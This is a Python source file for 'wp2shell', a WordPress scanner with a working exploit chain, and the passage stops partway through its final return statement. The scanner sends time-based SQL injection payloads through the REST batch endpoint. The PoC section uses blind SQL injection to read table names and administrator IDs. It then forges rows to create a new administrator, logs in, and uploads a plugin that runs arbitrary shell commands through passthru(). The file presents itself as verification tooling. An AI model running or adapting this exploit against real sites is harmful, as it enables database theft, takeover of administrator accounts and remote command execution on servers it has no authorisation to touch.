#!/usr/bin/env python3
"""wp2shell WordPress vulnerability scanner and optional verification PoC."""

from __future__ import annotations

import argparse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field
import hashlib
import html
import io
import json
from pathlib import Path
import re
import secrets
import statistics
import sys
import threading
import time
from typing import Any, Iterable, TextIO
from urllib.parse import quote, urlencode, urljoin, urlsplit, urlunsplit
import uuid
import zipfile

from colorama import Fore, Style, just_fix_windows_console
import requests


# ---------------------------------------------------------------------------
# Terminal presentation and input helpers
# ---------------------------------------------------------------------------

REQUEST_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/126.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
}

BANNER = r"""
 __        ______ ___  ____  ____  _   _ _____ _     _
 \ \      / /  _ \_  )/ ___|/ ___|| | | | ____| |   | |
  \ \ /\ / /| |_) / / \___ \___ \| |_| |  _| | |   | |
   \ V  V / |  __// /_ ___) |___) |  _  | |___| |___|_|
    \_/\_/  |_|  /___|____/|____/|_| |_|_____|_____|(_)
                  WordPress wp2shell scanner
"""

_PRINT_LOCK = threading.Lock()
_NO_COLOR = False


def init_colors() -> None:
    """Enable ANSI support on Windows without forcing colors into redirected output."""
    just_fix_windows_console()


def configure_colors(*, no_color: bool) -> None:
    """Configure the process-wide color policy used by terminal renderers."""
    global _NO_COLOR
    _NO_COLOR = no_color


def colors_enabled(stream: TextIO | None = None) -> bool:
    """Return whether terminal color should be emitted for *stream*."""
    if _NO_COLOR:
        return False
    active_stream = stream or sys.stdout
    return bool(getattr(active_stream, "isatty", lambda: False)())


def colorize(text: str, color: str, *, enabled: bool | None = None) -> str:
    """Apply a colorama color only when color output is appropriate."""
    if enabled is None:
        enabled = colors_enabled()
    return f"{color}{text}{Style.RESET_ALL}" if enabled else text


def emit(level: str, message: str, *, stream: TextIO | None = None) -> None:
    """Print one complete, color-coded line without interleaving worker output."""
    active_stream = stream or sys.stdout
    palette = {
        "success": Fore.GREEN,
        "failure": Fore.RED,
        "warning": Fore.YELLOW,
        "processing": Fore.YELLOW,
        "info": Fore.BLUE,
    }
    with _PRINT_LOCK:
        formatted = colorize(
            message,
            palette.get(level, Fore.BLUE),
            enabled=colors_enabled(active_stream),
        )
        print(formatted, file=active_stream, flush=True)


def print_banner(*, stream: TextIO | None = None) -> None:
    """Print the tool banner in blue."""
    active_stream = stream or sys.stdout
    with _PRINT_LOCK:
        print(
            colorize(BANNER.rstrip(), Fore.BLUE, enabled=colors_enabled(active_stream)),
            file=active_stream,
            flush=True,
        )


def normalize_url(value: str) -> str:
    """Normalize a target URL while retaining an optional WordPress subdirectory."""
    target = value.strip()
    if not target:
        raise ValueError("target URL is empty")
    if "://" not in target:
        target = f"http://{target}"

    parsed = urlsplit(target)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError(f"invalid HTTP(S) target: {value!r}")

    path = parsed.path.rstrip("/")
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def join_target(base_url: str, path_or_query: str) -> str:
    """Join a WordPress installation base URL with a route without dropping its path."""
    if path_or_query.startswith("?"):
        return f"{base_url.rstrip('/')}{path_or_query}"
    return f"{base_url.rstrip('/')}/{path_or_query.lstrip('/')}"


def load_targets(list_path: str) -> list[str]:
    """Read unique non-comment targets from a text file in first-seen order."""
    path = Path(list_path)
    try:
        if not path.is_file():
            raise ValueError(f"target list is not a readable file: {list_path}")
        lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError as exc:
        detail = exc.strerror or str(exc)
        raise ValueError(f"could not read target list {list_path}: {detail}") from exc

    targets: list[str] = []
    seen: set[str] = set()
    for line_number, line in enumerate(lines, start=1):
        target = line.strip()
        if not target or target.startswith("#"):
            continue
        try:
            normalized = normalize_url(target)
        except ValueError as exc:
            raise ValueError(
                f"invalid target in {list_path} at line {line_number}: {exc}"
            ) from exc
        if normalized not in seen:
            seen.add(normalized)
            targets.append(normalized)

    if not targets:
        raise ValueError(f"target list contains no usable URLs: {list_path}")
    return targets


def render_markers(markers: Iterable[str]) -> str:
    """Format evidence marker names for one-line output."""
    return ", ".join(markers) if markers else "none"


def normalize_command_output(output: str) -> str:
    """Normalize command output without changing its meaningful line structure."""
    return output.replace("\r\n", "\n").replace("\r", "\n").strip()


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 10.0
SLEEP_SECONDS = 4.0
DETECTION_ROUNDS = 3
ROUTE_MARKERS = (
    "parse_path_failed",
    "block_cannot_read",
    "rest_batch_not_allowed",
)
FULL_CHAIN_RANGES = (
    ((6, 9, 0), (6, 9, 4)),
    ((7, 0, 0), (7, 0, 1)),
)


class ScanTransportError(RuntimeError):
    """A target could not be queried reliably."""


@dataclass(slots=True)
class ScanResult:
    """A complete result for a single target."""

    target: str
    status: str
    wordpress: bool = False
    version: str | None = None
    markers: list[str] = field(default_factory=list)
    batch_endpoint: str | None = None
    route_markers: list[str] = field(default_factory=list)
    baseline_seconds: float | None = None
    delayed_seconds: float | None = None
    delta_seconds: float | None = None
    error: str | None = None
    note: str | None = None

    @property
    def actively_confirmed(self) -> bool:
        """Whether it is safe for the caller to progress to the optional PoC."""
        return self.status == "vulnerable"


def _parse_version(value: str | None) -> tuple[int, int, int] | None:
    if not value:
        return None
    match = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", value)
    if not match:
        return None
    return int(match.group(1)), int(match.group(2)), int(match.group(3) or 0)


def version_is_affected(version: str | None) -> bool:
    """Return whether a stable public version is within the full RCE-chain range."""
    parsed = _parse_version(version)
    return bool(parsed and any(low <= parsed <= high for low, high in FULL_CHAIN_RANGES))


def _walk_error_codes(value: Any, found: list[str]) -> None:
    if isinstance(value, dict):
        code = value.get("code")
        if code in ROUTE_MARKERS and code not in found:
            found.append(code)
        for child in value.values():
            _walk_error_codes(child, found)
    elif isinstance(value, list):
        for child in value:
            _walk_error_codes(child, found)


class Wp2ShellScanner:
    """Per-target scanner. Instances intentionally own independent HTTP sessions."""

    def __init__(
        self,
        target: str,
        *,
        timeout: float = DEFAULT_TIMEOUT,
        session: requests.Session | None = None,
    ) -> None:
        self.target = normalize_url(target)
        self.base_url = self.target
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.headers.update(REQUEST_HEADERS)
        self.batch_endpoint: str | None = None

    def scan(self) -> ScanResult:
        """Validate WordPress, then run structural and active timing checks."""
        result = ScanResult(target=self.target, status="error")
        try:
            wordpress, markers, version = self._validate_wordpress()
            result.target = self.base_url
            result.wordpress = wordpress
            result.markers = markers
            result.version = version
            if not wordpress:
                result.status = "not_wordpress"
                result.note = "No public WordPress markers or REST namespaces were found."
                return result

            endpoint = self._resolve_batch_endpoint()
            result.batch_endpoint = endpoint
            if not endpoint:
                self._set_negative_verdict(result, "The REST batch endpoint was unavailable.")
                return result

            result.route_markers = self._route_confusion_markers(endpoint)
            baseline, delayed = self._timing_differential(endpoint)
            result.baseline_seconds = round(baseline, 3)
            result.delayed_seconds = round(delayed, 3)
            result.delta_seconds = round(delayed - baseline, 3)

            active = (
                result.delta_seconds >= SLEEP_SECONDS * 0.6
                and result.baseline_seconds < SLEEP_SECONDS * 0.5
            )
            if active:
                result.status = "vulnerable"
                result.note = "Active timing differential matched the injected delay."
            else:
                self._set_negative_verdict(
                    result,
                    "The active timing probe did not meet the confirmation threshold.",
                )
            return result
        except ScanTransportError as exc:
            result.status = "error"
            result.error = str(exc)
            return result
        except (ValueError, KeyError, TypeError, json.JSONDecodeError) as exc:
            result.status = "error"
            result.error = f"unexpected response while scanning: {exc}"
            return result

    def _set_negative_verdict(self, result: ScanResult, reason: str) -> None:
        if version_is_affected(result.version):
            result.status = "potentially_affected"
            result.note = f"{reason} Public version is in an affected range; patch immediately."
        else:
            result.status = "not_vulnerable"
            result.note = reason

    def _get(self, url: str, *, follow_redirects: bool = True) -> requests.Response:
        try:
            return self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=follow_redirects,
            )
        except (
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout,
            requests.exceptions.SSLError,
            requests.exceptions.RequestException,
        ) as exc:
            raise ScanTransportError(f"GET {url}: {exc}") from exc

    def _post_json_preserving_redirects(
        self,
        url: str,
        payload: dict[str, Any],
    ) -> tuple[requests.Response, str, float]:
        """POST JSON and retain its body/method through a bounded redirect chain."""
        current_url = url
        started = time.perf_counter()
        for _ in range(6):
            try:
                response = self.session.post(
                    current_url,
                    json=payload,
                    timeout=self.timeout,
                    allow_redirects=False,
                    headers={"Content-Type": "application/json"},
                )
            except (
                requests.exceptions.ConnectionError,
                requests.exceptions.Timeout,
                requests.exceptions.SSLError,
                requests.exceptions.RequestException,
            ) as exc:
                raise ScanTransportError(f"POST {current_url}: {exc}") from exc

            if response.status_code not in {301, 302, 303, 307, 308}:
                return response, current_url, time.perf_counter() - started
            location = response.headers.get("Location")
            if not location:
                return response, current_url, time.perf_counter() - started
            current_url = urljoin(current_url, location)
        raise ScanTransportError(f"POST {url}: too many redirects")

    def _validate_wordpress(self) -> tuple[bool, list[str], str | None]:
        """Use public HTML and REST evidence to establish that the target is WordPress."""
        response = self._get(self.base_url)
        final = getattr(response, "url", self.base_url) or self.base_url
        parsed = urlsplit(final)
        if parsed.scheme and parsed.netloc:
            self.base_url = urlunsplit(
                (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "")
            )

        body = response.text or ""
        body_lower = body.lower()
        markers: list[str] = []
        if "wp-content/" in body_lower:
            markers.append("wp-content")
        if "wp-includes/" in body_lower:
            markers.append("wp-includes")
        if re.search(r"<meta[^>]+name=[\"']generator[\"'][^>]+wordpress", body, re.I):
            markers.append("generator")
        if "wordpress" in response.headers.get("X-Powered-By", "").lower():
            markers.append("x-powered-by")

        version = self._version_from_text(body)
        try:
            rest_response = self._get(join_target(self.base_url, "?rest_route=/"))
            if rest_response.status_code < 500:
                rest_data = rest_response.json()
                namespaces = rest_data.get("namespaces", []) if isinstance(rest_data, dict) else []
                if any(str(space).startswith("wp/") for space in namespaces):
                    markers.append("rest-api")
        except (ValueError, ScanTransportError):
            pass

        if not version:
            version = self._fingerprint_version()
        return bool(markers), markers, version

    @staticmethod
    def _version_from_text(text: str) -> str | None:
        patterns = (
            r"content=[\"']WordPress\s+([0-9.]+)[\"']",
            r"(?:ver|version)=([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
            r"Version\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
            r"https?://wordpress\.org/\?v=([0-9.]+)",
        )
        for pattern in patterns:
            match = re.search(pattern, text, re.I)
            if match:
                return match.group(1)
        return None

    def _fingerprint_version(self) -> str | None:
        for route in ("readme.html", "feed/"):
            try:
                response = self._get(join_target(self.base_url, route))
            except ScanTransportError:
                continue
            version = self._version_from_text(response.text or "")
            if version:
                return version
        return None

    def _resolve_batch_endpoint(self) -> str | None:
        payload = {"requests": []}
        for endpoint in (
            join_target(self.base_url, "?rest_route=/batch/v1"),
            join_target(self.base_url, "wp-json/batch/v1"),
        ):
            response, final_url, _ = self._post_json_preserving_redirects(endpoint, payload)
            if response.status_code in {200, 207}:
                self.batch_endpoint = final_url
                return final_url
        return None

    def _route_confusion_markers(self, endpoint: str) -> list[str]:
        """Send a non-writing structural batch probe and collect expected error markers."""
        payload = {
            "requests": [
                {"method": "POST", "path": "///"},
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
        response, _, _ = self._post_json_preserving_redirects(endpoint, payload)
        try:
            data = response.json()
        except ValueError:
            return []
        markers: list[str] = []
        _walk_error_codes(data, markers)
        return markers

    @staticmethod
    def _timing_envelope(author_exclude: str) -> dict[str, Any]:
        encoded = quote(author_exclude, safe="")
        inner = {
            "requests": [
                {"method": "POST", "path": "///"},
                {"method": "GET", "path": f"/wp/v2/users?author_exclude={encoded}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
                {"method": "POST", "path": "///", "body": {"name": "x"}},
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    @staticmethod
    def _sleep_payload(seconds: float) -> str:
        return f"0) OR (SELECT 1 FROM (SELECT SLEEP({seconds:g}))x)-- -"

    def _timing_differential(self, endpoint: str) -> tuple[float, float]:
        baseline: list[float] = []
        delayed: list[float] = []
        for _ in range(DETECTION_ROUNDS):
            _, _, elapsed = self._post_json_preserving_redirects(
                endpoint,
                self._timing_envelope(self._sleep_payload(0)),
            )
            baseline.append(elapsed)
        for _ in range(DETECTION_ROUNDS):
            _, _, elapsed = self._post_json_preserving_redirects(
                endpoint,
                self._timing_envelope(self._sleep_payload(SLEEP_SECONDS)),
            )
            delayed.append(elapsed)
        return statistics.median(baseline), statistics.median(delayed)


# ---------------------------------------------------------------------------
# Optional fixed-command verification PoC
# ---------------------------------------------------------------------------

class PocError(RuntimeError):
    """Raised for a failed PoC stage without leaking generated credentials."""


@dataclass(slots=True)
class PocResult:
    """Public PoC outcome. Generated administrator credentials are never retained here."""

    target: str
    success: bool
    output: str = ""
    cleanup_succeeded: bool | None = None
    error: str | None = None
    http_status: int | None = None
    x_action_redirect: str | None = None


@dataclass(slots=True)
class _CreatedAdmin:
    username: str
    password: str
    source_admin_id: int


def _mysql_hex(value: str) -> str:
    return f"0x{value.encode().hex()}" if value else "''"


class _Wp2ShellPoC:
    """Requests-based implementation of the referenced SQLi-to-shell verification chain."""

    _PRIMER = "http://:"
    _EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def __init__(self, target: str, *, timeout: float) -> None:
        self.base_url = normalize_url(target)
        self.timeout = timeout
        self.session = self._new_session()
        self.admin_session: requests.Session | None = None
        self.batch_endpoint = join_target(self.base_url, "?rest_route=/batch/v1")
        self.baseline = 0.0
        self.plugin_slug: str | None = None
        self.http_status: int | None = None
        self.x_action_redirect: str | None = None

    @staticmethod
    def _new_session() -> requests.Session:
        session = requests.Session()
        session.headers.update(REQUEST_HEADERS)
        return session

    def _request(
        self,
        session: requests.Session,
        method: str,
        url: str,
        **kwargs: Any,
    ) -> requests.Response:
        try:
            return session.request(method, url, timeout=self.timeout, **kwargs)
        except (
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout,
            requests.exceptions.SSLError,
            requests.exceptions.RequestException,
        ) as exc:
            raise PocError(f"request failed: {exc}") from exc

    def _post_json_preserving_redirects(
        self,
        session: requests.Session,
        url: str,
        payload: dict[str, Any],
    ) -> tuple[requests.Response, str, float]:
        current_url = url
        started = time.perf_counter()
        for _ in range(6):
            response = self._request(
                session,
                "POST",
                current_url,
                json=payload,
                allow_redirects=False,
                headers={"Content-Type": "application/json"},
            )
            if response.status_code not in {301, 302, 303, 307, 308}:
                return response, current_url, time.perf_counter() - started
            location = response.headers.get("Location")
            if not location:
                return response, current_url, time.perf_counter() - started
            current_url = urljoin(current_url, location)
        raise PocError("too many redirects while posting a batch request")

    @staticmethod
    def _sleep_payload(seconds: float) -> str:
        return f"0) OR (SELECT 1 FROM (SELECT SLEEP({seconds:g}))x)-- -"

    @staticmethod
    def _timing_envelope(author_exclude: str) -> dict[str, Any]:
        encoded = quote(author_exclude, safe="")
        inner = {
            "requests": [
                {"method": "POST", "path": "///"},
                {"method": "GET", "path": f"/wp/v2/users?author_exclude={encoded}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
                {"method": "POST", "path": "///", "body": {"name": "x"}},
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    def _probe(self, author_exclude: str) -> float:
        _, endpoint, elapsed = self._post_json_preserving_redirects(
            self.session,
            self.batch_endpoint,
            self._timing_envelope(author_exclude),
        )
        self.batch_endpoint = endpoint
        return elapsed

    def _confirm_active(self) -> None:
        """Reconfirm the active timing signal before making any state changes."""
        baseline = statistics.median(
            self._probe(self._sleep_payload(0)) for _ in range(DETECTION_ROUNDS)
        )
        delayed = statistics.median(
            self._probe(self._sleep_payload(SLEEP_SECONDS))
            for _ in range(DETECTION_ROUNDS)
        )
        if delayed - baseline < SLEEP_SECONDS * 0.6 or baseline >= SLEEP_SECONDS * 0.5:
            raise PocError("active timing confirmation was not reproduced")
        self.baseline = baseline

    def _oracle(self, condition: str, *, unit: float = 0.6) -> bool:
        payload = (
            "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -"
            % (condition, unit)
        )
        elapsed = self._probe(payload)
        return elapsed > self.baseline + unit * 0.6

    def _read_scalar(self, expression: str, *, max_length: int = 64) -> str:
        wrapped = f"COALESCE(({expression}),'')"
        low, high = 0, max_length
        while low < high:
            middle = (low + high + 1) // 2
            if self._oracle(f"CHAR_LENGTH({wrapped})>={middle}"):
                low = middle
            else:
                high = middle - 1

        value: list[str] = []
        for position in range(1, low + 1):
            lower, upper = 32, 126
            while lower < upper:
                middle = (lower + upper + 1) // 2
                if self._oracle(f"ASCII(SUBSTRING({wrapped},{position},1))>={middle}"):
                    lower = middle
                else:
                    upper = middle - 1
            value.append(chr(lower))
        return "".join(value)

    def _read_int(self, expression: str) -> int:
        wrapped = f"COALESCE(({expression}),0)"
        low, high = 0, 1
        while self._oracle(f"{wrapped}>={high}"):
            low, high = high, high * 2
            if high > 2**31:
                raise PocError("integer extraction exceeded a safe bound")
        while low < high:
            middle = (low + high + 1) // 2
            if self._oracle(f"{wrapped}>={middle}"):
                low = middle
            else:
                high = middle - 1
        return low

    def _rce_send(self, inner_requests: list[dict[str, Any]]) -> None:
        payload = {
            "requests": [
                {"method": "POST", "path": self._PRIMER},
                {
                    "method": "POST",
                    "path": "/wp/v2/posts",
                    "body": {"requests": inner_requests},
                },
                {"method": "POST", "path": "/batch/v1"},
            ]
        }
        self._post_json_preserving_redirects(self.session, self.batch_endpoint, payload)

    @staticmethod
    def _post_row(
        post_id: int,
        content: str,
        title: str,
        status: str,
        slug: str,
        parent: int,
        post_type: str,
    ) -> str:
        values = (
            str(post_id), "1", _mysql_hex("2020-01-01 00:00:00"),
            _mysql_hex("2020-01-01 00:00:00"), _mysql_hex(content),
            _mysql_hex(title), "''", _mysql_hex(status), _mysql_hex("closed"),
            _mysql_hex("closed"), "''", _mysql_hex(slug), "''", "''",
            _mysql_hex("2020-01-01 00:00:00"), _mysql_hex("2020-01-01 00:00:00"),
            "''", str(parent), "''", "0", _mysql_hex(post_type), "''", "0",
        )
        return ",".join(values)

    def _forge(
        self,
        rows: list[str],
        *,
        extra_requests: list[dict[str, Any]] | None = None,
    ) -> None:
        query = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        parameters = urlencode(
            {
                "author_exclude": query,
                "per_page": -1,
                "orderby": "none",
                "context": "view",
            }
        )
        inner_requests = [
            {"method": "GET", "path": self._PRIMER},
            {"method": "GET", "path": f"/wp/v2/widgets?{parameters}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        inner_requests.extend(extra_requests or [])
        self._rce_send(inner_requests)

    def _first_post_link(self) -> str:
        response = self._request(
            self.session,
            "GET",
            join_target(self.base_url, "?rest_route=/wp/v2/posts&per_page=1&_fields=link"),
        )
        try:
            posts = response.json()
            link = posts[0]["link"]
        except (ValueError, IndexError, KeyError, TypeError) as exc:
            raise PocError(
                "no public WordPress post is available for the verification chain"
            ) from exc
        if not isinstance(link, str) or not link.startswith(("http://", "https://")):
            raise PocError("the public post did not include a usable permalink")
        return link

    def _create_admin(self) -> _CreatedAdmin:
        nonce = secrets.token_hex(6)
        public_link = self._first_post_link()
        embed_urls = [f"{public_link}#{nonce}{index}" for index in range(3)]

        seed_content = "".join(
            f'[embed width="500" height="750"]{url}[/embed]' for url in embed_urls
        )
        self._forge([self._post_row(0, seed_content, "seed", "publish", "seed", 0, "post")])

        posts_table = self._read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        )
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise PocError("could not resolve the WordPress posts table")
        prefix = posts_table[:-5]
        source_admin_id = self._read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m ON m.user_id=u.ID "
            "WHERE m.meta_key=%s AND INSTR(m.meta_value,%s)>0 ORDER BY u.ID LIMIT 1"
            % (
                prefix,
                prefix,
                _mysql_hex(prefix + "capabilities"),
                _mysql_hex('s:13:"administrator";b:1;'),
            )
        )
        if source_admin_id < 1:
            raise PocError("could not locate an existing WordPress administrator")

        cache_ids: list[int] = []
        for url in embed_urls:
            key = hashlib.md5((url + self._EMBED_ATTR).encode()).hexdigest()
            cache_id = self._read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1"
                % (posts_table, key.encode().hex())
            )
            if cache_id < 1:
                raise PocError("temporary oEmbed cache creation did not complete")
            cache_ids.append(cache_id)
        if len(set(cache_ids)) != 3:
            raise PocError("temporary oEmbed cache identifiers were not distinct")

        username = f"w2s_{nonce}"
        password = f"W2s!{secrets.token_urlsafe(15)}"
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2
        changeset = json.dumps(
            {
                f"nav_menu_item[{nav_id}]": {
                    "value": {
                        "object_id": 0,
                        "object": "",
                        "menu_item_parent": 0,
                        "position": 0,
                        "type": "custom",
                        "title": "proof",
                        "url": "https://example.invalid/",
                        "target": "",
                        "attr_title": "",
                        "description": "proof",
                        "classes": "",
                        "xfn": "",
                        "status": "publish",
                        "nav_menu_term_id": 0,
                        "_invalid": False,
                    },
                    "type": "nav_menu_item",
                    "user_id": source_admin_id,
                }
            },
            separators=(",", ":"),
        )
        poisoned_rows = [
            self._post_row(0, f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                           "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                           str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft", "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish", "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish", "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse", "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft", "inner", cache_ids[2], "post"),
        ]
        new_admin = {
            "username": username,
            "email": f"{username}@wp2shell.invalid",
            "password": password,
            "roles": ["administrator"],
        }
        self._forge(
            poisoned_rows,
            extra_requests=[
                {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
                {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            ],
        )
        return _CreatedAdmin(username, password, source_admin_id)

    def _login(self, created: _CreatedAdmin) -> None:
        self.admin_session = self._new_session()
        login_url = join_target(self.base_url, "wp-login.php")
        self._request(self.admin_session, "GET", login_url)
        self._request(
            self.admin_session,
            "POST",
            login_url,
            data={
                "log": created.username,
                "pwd": created.password,
                "wp-submit": "Log In",
                "redirect_to": join_target(self.base_url, "wp-admin/"),
                "testcookie": "1",
            },
        )
        users_page = self._request(
            self.admin_session,
            "GET",
            join_target(self.base_url, "wp-admin/users.php"),
        ).text
        if created.username not in users_page:
            raise PocError("temporary administrator authentication failed")

    def _deploy_and_run(self, command: str, created: _CreatedAdmin) -> tuple[str, bool]:
        if not self.admin_session:
            raise PocError("administrator session was not initialized")
        upload_page = self._request(
            self.admin_session,
            "GET",
            join_target(self.base_url, "wp-admin/plugin-install.php?tab=upload"),
        ).text
        nonce_match = re.search(r'name=["\']_wpnonce["\'] value=["\']([^"\']+)', upload_page)
        if not nonce_match:
            raise PocError("plugin-upload nonce was not found")

        self.plugin_slug = f"wp2shell-{secrets.token_hex(6)}"
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        plugin_source = self._plugin_source(self.plugin_slug, route, marker)
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as package:
            package.writestr(f"{self.plugin_slug}/{self.plugin_slug}.php", plugin_source)

        install = self._request(
            self.admin_session,
            "POST",
            join_target(self.base_url, "wp-admin/update.php?action=upload-plugin"),
            data={
                "_wpnonce": nonce_match.group(1),
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
            },
            files={
                "pluginzip": (
                    f"{self.plugin_slug}.zip",
                    archive.getvalue(),
                    "application/zip",
                )
            },
        )
        activate_match = re.search(
            r'href=["\']([^"\']*plugins\.php\?action=activate[^"\']*)',
            install.text,
        )
        if not activate_match:
            raise PocError("plugin activation link was not returned")
        activation_url = urljoin(
            join_target(self.base_url, "wp-admin/"),
            html.unescape(activate_match.group(1)),
        )
        self._request(self.admin_session, "GET", activation_url)

        command_response = self._request(
            self.admin_session,
            "POST",
            join_target(self.base_url, f"?rest_route=/wp2shell/v1/{route}"),
            json={
                "c": base64.b64encode(command.encode()).decode(),
                "cleanup_user": created.username,
                "reassign_to": created.source_admin_id,
            },
            headers={"Content-Type": "application/json"},
        )
        self.http_status = getattr(command_response, "status_code", None)
        response_headers = getattr(command_response, "headers", {}) or {}
        self.x_action_redirect = response_headers.get("X-Action-Redirect")
        try:
            payload = command_response.json()
        except ValueError as exc:
            raise PocError("the temporary verification plugin returned invalid JSON") from exc
        if not isinstance(payload, dict):
            raise PocError("the temporary verification plugin returned an invalid JSON object")
        if payload.get("marker") != marker or not isinstance(payload.get("output"), str):
            raise PocError("the temporary verification plugin did not respond correctly")
        cleanup_succeeded = bool(
            payload.get("cleanup_user") and payload.get("plugin_removed")
        )
        return payload["output"], cleanup_succeeded

    @staticmethod
    def _plugin_source(slug: str, route: str, marker: str) -> str:
        """Build a one-shot plugin endpoint that deactivates and removes itself."""
        return f'''<?php
/* Plugin Name: {slug} */
add_action('rest_api_init', function () {{
    register_rest_route('wp2shell/v1', '/{route}', array(
        'methods' => 'POST',
        'permission_callback' => '__return_true',
        'callback' => function ($request) {{
            ob_start();
            passthru(base64_decode($request->get_param('c')) . ' 2>&1');
            $output = ob_get_clean();
            $user_removed = false;
            $cleanup_user = sanitize_user($request->get_param('cleanup_user'));
            $reassign_to = absint($request->get_param('reassign_to'));
            if ($cleanup_user && $reassign_to) {{
                $user = get_user_by('login', $cleanup_user);
                if ($user) {{
                    require_once ABSPATH . 'wp-admin/includes/user.php';
                    $user_removed = (bool) wp_delete_user($user->ID, $reassign_to);
                }}
            }}
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
            deactivate_plugins(plugin_basename(__FILE__), true);
            $plugin_removed = @unlink(__FILE__);
            return new WP_REST_Response(array(
                'marker' => '{marker}',
                'output' => $output,
                'cleanup_user' => $user_removed,
                'plugin_removed' => $plugin_removed,
            ));
        }},
    ));
}});
'''

    def _delete_generated_admin(self, created: _CreatedAdmin) -> bool:
        """Best-effort dashboard cleanup using the temporary administrator session."""
        if not self.admin_session:
            return False
        try:
            users_url = join_target(self.base_url, f"wp-admin/users.php?s={created.username}")
            users_page = self._request(self.admin_session, "GET", users_url).text
            row_match = re.search(
                rf'<tr[^>]+id=["\']user-(\d+)["\'][^>]*>.*?{re.escape(created.username)}.*?</tr>',
                users_page,
                re.S,
            )
            if not row_match:
                return False
            user_id = row_match.group(1)
            confirm = self._request(
                self.admin_session,
                "GET",
                join_target(self.base_url, f"wp-admin/users.php?action=delete&user={user_id}"),
            )
            nonce_match = re.search(r'name=["\']_wpnonce["\'] value=["\']([^"\']+)', confirm.text)
            if not nonce_match:
                return False
            self._request(
                self.admin_session,
                "POST",
                join_target(self.base_url, "wp-admin/users.php?action=dodelete"),
                data={
                    "_wpnonce": nonce_match.group(1),
                    "users[]": user_id,
                    "reassign_user": str(created.source_admin_id),
                },
            )
            verification = self._request(self.admin_session, "GET", users_url).text
            return created.username not in verification
        except PocError:
            return False

    def _plugin_cleanup_verified(self) -> bool:
        if not self.admin_session or not self.plugin_slug:
            return False
        try:
            plugins = self._request(
                self.admin_session,
                "GET",
                join_target(self.base_url, "wp-admin/plugins.php"),
            ).text
            return self.plugin_slug not in plugins
        except PocError:
            return False

    def run(self, command: str = "whoami") -> PocResult:
        created: _CreatedAdmin | None = None
        output = ""
        command_succeeded = False
        cleanup_ok: bool | None = None
        failure: str | None = None
        try:
            self._confirm_active()
            created = self._create_admin()
            self._login(created)
            output, cleanup_ok = self._deploy_and_run(command, created)
            output = normalize_command_output(output)
            command_succeeded = True
        except PocError as exc:
            failure = str(exc)
        finally:
            if created and cleanup_ok is not True:
                admin_removed = self._delete_generated_admin(created)
                plugin_removed = self._plugin_cleanup_verified()
                cleanup_ok = bool(cleanup_ok) or (admin_removed and plugin_removed)

        if failure:
            return PocResult(
                target=self.base_url,
                success=False,
                cleanup_succeeded=cleanup_ok,
                error=failure,
                http_status=self.http_status,
                x_action_redirect=self.x_action_redirect,
            )
        return PocResult(
            target=self.base_url,
            success=command_succeeded,
            output=output,
            cleanup_succeeded=cleanup_ok,
            http_status=self.http_status,
